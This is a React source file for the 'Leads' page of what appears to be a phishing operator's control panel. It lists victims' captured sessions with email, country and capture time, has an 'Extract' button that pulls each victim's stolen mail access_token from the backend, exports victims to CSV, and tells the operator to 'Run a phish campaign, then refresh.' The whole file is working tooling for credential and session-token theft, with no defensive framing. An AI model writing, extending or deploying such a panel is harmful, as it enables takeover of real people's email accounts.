import { useEffect, useMemo, useState } from 'react'
import { Inbox, Send, FileText, Trash, AlertCircle, RefreshCw, Search, Users, Download } from 'lucide-react'
import { useToast } from '../components/Toast'
import { sessionsApi, tokensApi } from '../lib/api'
import { flag as flagEmoji, formatDate, truncate, downloadFile } from '../lib/utils'

const folders = [
  { id: 'inbox', label: 'Inbox', icon: Inbox },
  { id: 'sent', label: 'Sent', icon: Send },
  { id: 'drafts', label: 'Drafts', icon: FileText },
  { id: 'trash', label: 'Trash', icon: Trash },
  { id: 'spam', label: 'Spam', icon: AlertCircle }
]

const FOLDER_OF = {
  Inbox: 'INBOX',
  Sent: 'Sent Items',
  Drafts: 'Drafts',
  Trash: 'Deleted Items',
  Spam: 'Junk Email'
}

export default function Leads() {
  const toast = useToast()
  const [folder, setFolder] = useState('inbox')
  const [allSessions, setAllSessions] = useState([])
  const [tokenMap, setTokenMap] = useState({})
  const [search, setSearch] = useState('')
  const [extracting, setExtracting] = useState(null)
  const [progress, setProgress] = useState(0)
  const [loading, setLoading] = useState(true)

  const refresh = async () => {
    setLoading(true)
    try {
      const [sessions, tokens] = await Promise.all([
        sessionsApi.list().catch(() => []),
        tokensApi.list().catch(() => [])
      ])
      setAllSessions(sessions || [])
      const map = {}
      ;(tokens || []).forEach((t) => {
        if (t && t.name) map[t.name] = t
      })
      setTokenMap(map)
    } catch (e) {
      toast.error('Could not load leads from backend')
    } finally {
      setLoading(false)
    }
  }

  useEffect(() => { refresh() }, [])

  const leads = useMemo(() => {
    return (allSessions || []).map((s, i) => {
      const decodedMail = (s.email || '').toLowerCase()
      const folderLabel =
        s.status === 'Expired' ? 'Trash' : 'Inbox'
      return {
        id: s.id ?? i,
        email: s.email || 'unknown@unknown',
        name: (s.email || '').split('@')[0].replace(/[._]/g, ' ') || 'Unknown',
        folder: folderLabel,
        count: tokenMap[s.name || ''] ? 1 : 0,
        country: s.country || 'UNK',
        status: s.status || 'Active',
        captured: s.captured,
        raw: s
      }
    })
  }, [allSessions, tokenMap])

  const visible = useMemo(() => {
    const q = search.trim().toLowerCase()
    return leads.filter((l) => {
      if (q && !`${l.email} ${l.name}`.toLowerCase().includes(q)) return false
      if (folder === 'trash') return l.status === 'Expired'
      if (folder === 'inbox') return l.status !== 'Expired'
      return true
    })
  }, [leads, search, folder])

  const extract = async (lead) => {
    setExtracting(lead.id)
    setProgress(0)
    const tick = setInterval(() => {
      setProgress((p) => (p >= 90 ? 90 : p + Math.random() * 12))
    }, 180)

    try {
      const data = await sessionsApi.mailToken(lead.id).catch(() => null)
      clearInterval(tick)
      setProgress(100)
      if (!data || !data.token) {
        toast.error(`No access_token captured for ${lead.email}`)
      } else {
        toast.success(`Extracted ${data.token.slice(0, 24)}... for ${lead.email}`)
      }
    } catch {
      clearInterval(tick)
      toast.error(`Failed to extract for ${lead.email}`)
    } finally {
      setTimeout(() => { setExtracting(null); setProgress(0) }, 600)
    }
  }

  const exportLeads = () => {
    const csv = [
      ['email', 'name', 'folder', 'country', 'status', 'captured'].join(','),
      ...visible.map((l) =>
        [l.email, l.name, l.folder, l.country, l.status, l.captured || '']
          .map((v) => `"${String(v).replace(/"/g, '""')}"`).join(',')
      )
    ].join('\n')
    downloadFile(csv, `leads-${Date.now()}.csv`, 'text/csv')
    toast.success(`Exported ${visible.length} leads`)
  }

  return (
    <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
      <aside className="glass rounded-2xl p-4 border border-white/10">
        <h3 className="text-xs uppercase text-gray-400 tracking-wider px-2 mb-3">Mailboxes</h3>
        <div className="space-y-1">
          {folders.map((f) => (
            <button key={f.id} onClick={() => setFolder(f.id)}
              className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-xl text-sm transition ${folder === f.id ? 'bg-accent/15 text-accent border border-accent/30' : 'text-gray-300 hover:bg-white/5'}`}>
              <f.icon size={16} />{f.label}
            </button>
          ))}
        </div>
        <h3 className="text-xs uppercase text-gray-400 tracking-wider px-2 mt-6 mb-3 flex items-center justify-between">
          <span>Leads Pool</span>
          <span className="text-accent">{leads.length}</span>
        </h3>
        <div className="space-y-2 max-h-96 overflow-y-auto">
          {loading ? (
            <div className="text-xs text-gray-500 px-2 py-3 flex items-center gap-2"><RefreshCw size={12} className="animate-spin" />Loading…</div>
          ) : leads.length === 0 ? (
            <div className="text-xs text-gray-500 px-2 py-3">No captured sessions yet</div>
          ) : leads.slice(0, 12).map((l) => (
            <div key={l.id} className="px-3 py-2 rounded-xl bg-white/5 hover:bg-white/10 cursor-pointer">
              <div className="text-sm text-white truncate">{l.name}</div>
              <div className="text-xs text-gray-400 truncate">{l.email}</div>
            </div>
          ))}
        </div>
      </aside>

      <div className="lg:col-span-3 glass rounded-2xl p-5 border border-white/10">
        <div className="flex items-center justify-between mb-4 flex-wrap gap-3">
          <h3 className="text-lg font-semibold text-white flex items-center gap-2">
            <Users size={18} />Captured Leads
            <span className="text-xs text-gray-400 bg-white/5 px-2 py-1 rounded-full">{visible.length} visible</span>
          </h3>
          <div className="flex items-center gap-2">
            <div className="relative">
              <Search size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" />
              <input
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder="Search leads…"
                className="pl-9 pr-3 py-2 w-64 text-sm"
              />
            </div>
            <button onClick={refresh} className="px-3 py-2 rounded-lg bg-white/5 hover:bg-white/10 text-gray-300 text-xs flex items-center gap-2">
              <RefreshCw size={14} />Refresh
            </button>
            <button onClick={exportLeads} disabled={!visible.length}
              className="px-3 py-2 rounded-lg bg-accent/15 hover:bg-accent/25 text-accent text-xs flex items-center gap-2 disabled:opacity-40">
              <Download size={14} />Export CSV
            </button>
          </div>
        </div>

        <div className="overflow-x-auto rounded-xl border border-white/5">
          <table className="w-full text-sm">
            <thead className="bg-white/5 text-gray-400 text-xs uppercase">
              <tr>
                <th className="px-4 py-3 text-left">Email</th>
                <th className="px-4 py-3 text-left">Name</th>
                <th className="px-4 py-3 text-left">Folder</th>
                <th className="px-4 py-3 text-left">Country</th>
                <th className="px-4 py-3 text-left">Status</th>
                <th className="px-4 py-3 text-left">Captured</th>
                <th className="px-4 py-3 text-right">Action</th>
              </tr>
            </thead>
            <tbody>
              {loading ? (
                <tr><td colSpan={7} className="text-center text-gray-500 py-10"><RefreshCw className="inline animate-spin mr-2" size={14} />Loading leads…</td></tr>
              ) : visible.length === 0 ? (
                <tr><td colSpan={7} className="text-center text-gray-500 py-10">No captured leads. Run a phish campaign, then refresh.</td></tr>
              ) : visible.map((l) => (
                <tr key={l.id} className="border-t border-white/5 hover:bg-white/5">
                  <td className="px-4 py-3 text-white">{truncate(l.email, 30)}</td>
                  <td className="px-4 py-3 text-gray-300">{l.name}</td>
                  <td className="px-4 py-3"><span className="px-2 py-0.5 text-xs rounded-full bg-accent/15 text-accent">{l.folder}</span></td>
                  <td className="px-4 py-3 text-xl">{flagEmoji(l.country)}</td>
                  <td className="px-4 py-3"><span className={`px-2 py-0.5 text-xs rounded-full ${l.status === 'Active' ? 'bg-success/15 text-success' : 'bg-danger/15 text-danger'}`}>{l.status}</span></td>
                  <td className="px-4 py-3 text-gray-400 text-xs">{formatDate(l.captured)}</td>
                  <td className="px-4 py-3 text-right">
                    <button disabled={extracting === l.id} onClick={() => extract(l)}
                      className="px-3 py-1.5 rounded-lg bg-accent/15 text-accent text-xs hover:bg-accent/25 border border-accent/30 disabled:opacity-50">
                      {extracting === l.id ? 'Extracting…' : 'Extract'}
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        {extracting && (
          <div className="mt-5 glass rounded-xl p-4 border border-accent/30">
            <div className="flex items-center justify-between text-sm mb-2">
              <span className="text-gray-300 flex items-center gap-2"><RefreshCw className="animate-spin" size={14} />Extracting token…</span>
              <span className="text-accent font-medium">{Math.round(progress)}%</span>
            </div>
            <div className="h-2 bg-white/5 rounded-full overflow-hidden">
              <div className="h-full bg-gradient-to-r from-accent to-purple transition-all" style={{ width: `${progress}%` }} />
            </div>
          </div>
        )}
      </div>
    </div>
  )
}